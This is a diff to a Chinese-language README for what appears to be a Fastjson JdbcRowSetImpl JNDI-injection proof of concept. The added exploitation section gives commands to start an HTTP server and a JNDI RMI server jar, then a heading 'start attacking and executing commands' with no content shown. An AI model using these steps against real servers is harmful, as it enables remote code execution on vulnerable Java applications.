@@ -44,7 +44,9 @@ public class CommandObject {
 
 ![20181019](https://github.com/iBearcat/FastJson-JdbcRowSetImpl/blob/master/images/3.jpg?raw=true)
 
-### 开启一个HTTP服务
+## 漏洞利用
+
+### 开启一个HTTP服务，并且开启 RMIServer
 
 ### 如：
 
@@ -52,3 +54,14 @@ public class CommandObject {
 Python2 -m SimpleHTTPServer 80
 Python3 -m http.server 80
 ```
+```
+java -jar FastJson_JdbcRowSetImpl_JNDI_RMIServer.jar <HTTP服务地址> 指定RMI端口
+```
+
+### 
+
+![20181019](https://github.com/iBearcat/FastJson-JdbcRowSetImpl/blob/master/images/4.jpg?raw=true)
+
+### 开始攻击并执行命令
+
+
